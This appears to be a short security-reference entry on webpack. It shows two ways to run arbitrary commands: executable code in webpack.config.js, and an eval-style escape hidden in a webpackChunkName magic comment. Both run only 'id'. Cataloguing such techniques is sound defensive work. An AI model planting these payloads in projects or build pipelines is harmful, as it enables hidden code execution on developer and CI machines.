---
title: webpack
tags:
  - cli
  - config-file
  - eval-js
references:
- https://webpack.js.org/configuration/#root
- https://webpack.js.org/api/module-methods/#magic-comments
files: [webpack.config.js]
credits:
- allanlw
---

`webpack` is a javascript bundler.

## Config

`webpack` will load and execute configuration `webpack.config.js` in the current directory.

```typescript
require("child_process").execSync("id");
```

## Comments

`webpack` will execute magic comments in analyzed files.

```typescript
import(
    /* webpackChunkName: this.constructor.constructor(`(function() {
     let require = process.mainModule.require;
     let child_process = require('child_process');
     child_process.execSync('id');
   })()`)() */
    "buffer"
);
```
